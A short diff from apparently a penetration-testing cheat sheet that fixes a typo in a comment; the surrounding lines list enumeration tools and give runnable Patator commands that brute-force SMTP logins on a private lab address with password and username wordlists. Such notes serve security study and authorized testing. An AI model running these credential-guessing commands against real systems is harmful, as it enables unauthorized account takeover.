@@ -67,7 +67,7 @@ Nmap to avoid the firewall
     dirsearch 
     DirBuster
     Patator- password guessing attacks
-# Brute force with Patatpr
+# Brute force with Patator
     git clone https://github.com/lanjelot/patator.git /usr/share/patator
     $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
     $ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
